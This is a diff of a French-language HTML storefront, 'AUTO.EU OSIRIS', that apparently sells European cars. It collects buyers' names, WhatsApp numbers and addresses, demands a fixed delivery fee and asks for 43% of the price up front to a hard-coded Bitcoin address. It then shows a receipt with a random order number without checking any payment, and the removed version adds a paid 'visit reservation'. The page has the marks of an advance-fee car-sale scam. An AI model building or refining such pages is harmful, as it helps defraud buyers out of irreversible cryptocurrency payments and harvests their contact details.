@@ -1,105 +1,93 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>AUTO.EU OSIRIS</title>
-<style>
-body{font-family:Arial;margin:0;background:#f4f4f4}
-header{background:#000;color:#fff;padding:15px;text-align:center}
-.container{padding:20px}
-.card{background:#fff;padding:15px;margin:10px 0;border-radius:10px}
-button{padding:10px;border:none;background:#000;color:#fff;border-radius:5px}
-input,select{width:100%;padding:10px;margin:5px 0}
-.hidden{display:none}
-.code{background:#eee;padding:10px;border-radius:5px;word-break:break-all}
-</style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>AUTO.EU OSIRIS</title>
+  <style>
+    body {font-family: Arial, sans-serif; background:#f4f4f4; margin:0;}
+    header {background:#000; color:#fff; padding:30px; text-align:center;}
+    .box {background:#fff; margin:15px; padding:20px; border-radius:10px;}
+    select,input,button {width:100%; padding:12px; margin-top:10px;}
+    button {background:#000; color:#fff; border:none; border-radius:5px;}
+    #validerPaiement:disabled {opacity:0.5;}
+  </style>
 </head>
 <body>
+
 <header>
 <h1>AUTO.EU OSIRIS</h1>
 <p>Achat sécurisé - 43% maintenant, le reste après réception</p>
 </header>
 
-<div class="container">
-
-<div class="card">
+<div class="box">
 <h2>Catalogue</h2>
 <select id="marque">
-<option>BMW</option>
-<option>Audi</option>
-<option>Mercedes</option>
 <option>Volkswagen</option>
-<option>Toyota</option>
+<option>Mercedes</option>
+<option>BMW</option>
 </select>
-<button onclick="showModels()">Voir modèles</button>
+<button>Voir modèles</button>
 </div>
 
-<div class="card hidden" id="models">
+<div class="box">
 <h2>Modèles</h2>
-<select id="model">
-<option>X5</option>
-<option>A4</option>
+<select id="modele">
 <option>C200</option>
-<option>Golf</option>
-<option>Hilux</option>
+<option>Golf 8</option>
+<option>X5</option>
 </select>
-<button onclick="showForm()">Choisir</button>
+<button>Choisir</button>
 </div>
 
-<div class="card hidden" id="form">
+<div class="box">
 <h2>Informations Client</h2>
-<input placeholder="Nom" id="nom">
-<input placeholder="Prénom" id="prenom">
-<input placeholder="WhatsApp" id="whatsapp">
-<input placeholder="Téléphone" id="tel">
-<input placeholder="Pays" id="pays">
-<input placeholder="Adresse de livraison" id="adresse">
+<input id="prenom" placeholder="Prénom">
+<input id="nom" placeholder="Nom">
+<input id="whatsapp" placeholder="WhatsApp">
+<input placeholder="Adresse">
+<input value="Bénin">
+<input value="Cotonou">
 
 <h3>Livraison obligatoire</h3>
-<select id="livraison">
-<option value="500">Allemagne - 500€</option>
-<option value="745">Hors Allemagne - 745€</option>
+<select>
+<option>Allemagne - 500€</option>
 </select>
-
-<button onclick="showPayment()">Passer à la caisse</button>
+<button onclick="passerCaisse()">Passer à la caisse</button>
 </div>
 
-<div class="card hidden" id="payment">
+<div class="box">
 <h2>Paiement 43%</h2>
 <p>Envoyez 43% du montant du véhicule à l'adresse BTC ci-dessous.</p>
-<p>Votre commission (5%) est prélevée automatiquement.</p>
-<div class="code" id="btcaddr">bc1q3hmeu7w33ulkyqc2rthwfnnkfesykaj0fmnkyl</div>
-<button onclick="copyBTC()">Copier l'adresse BTC</button>
+<input value="bc1q3hmeu7w33ulkyqc2rthwfnnkfesykaj0fmnkyl" readonly>
+<button onclick="copierBTC()">Copier l'adresse BTC</button>
 <p>Après paiement cliquez sur Valider.</p>
-<button onclick="generateReceipt()">Valider Paiement</button>
+<button id="validerPaiement" disabled>Valider Paiement (En attente BTC)</button>
 </div>
 
-<div class="card hidden" id="receipt">
+<div class="box" id="recu" style="display:none;">
 <h2>Reçu</h2>
-<p id="rec"></p>
-</div>
-
-<div class="card">
-<h2>Visite Physique</h2>
-<p>Réservation obligatoire : 250€</p>
-<button onclick="alert('Paiement requis pour obtenir l\\'adresse exacte')">Réserver visite</button>
-</div>
-
+<p id="commande"></p>
+<p id="nomclient"></p>
+<p id="whats"></p>
+<p id="date"></p>
 </div>
 
 <script>
-function showModels(){document.getElementById('models').classList.remove('hidden')}
-function showForm(){document.getElementById('form').classList.remove('hidden')}
-function showPayment(){document.getElementById('payment').classList.remove('hidden')}
-function copyBTC(){navigator.clipboard.writeText(document.getElementById('btcaddr').innerText);alert('Adresse BTC copiée');}
-function generateReceipt(){
-let d=new Date();
-let cmd='CMD-'+Math.floor(Math.random()*1000000);
-document.getElementById('receipt').classList.remove('hidden');
-document.getElementById('rec').innerHTML="Commande: "+cmd+"<br>Nom: "+document.getElementById('nom').value+"<br>WhatsApp: "+document.getElementById('whatsapp').value+"<br>Date: "+d.toLocaleString();
+function copierBTC(){
+ navigator.clipboard.writeText("bc1q3hmeu7w33ulkyqc2rthwfnnkfesykaj0fmnkyl");
+ alert("Adresse BTC copiée");
+}
+
+function passerCaisse(){
+ let cmd = "CMD-" + Math.floor(Math.random()*999999);
+ document.getElementById("recu").style.display="block";
+ document.getElementById("commande").innerText="Commande: "+cmd;
+ document.getElementById("nomclient").innerText="Nom: "+document.getElementById("prenom").value;
+ document.getElementById("whats").innerText="WhatsApp: "+document.getElementById("whatsapp").value;
+ document.getElementById("date").innerText="Date: "+new Date().toLocaleString();
 }
 </script>
 
 </body>
-                                      </html>
+</html>
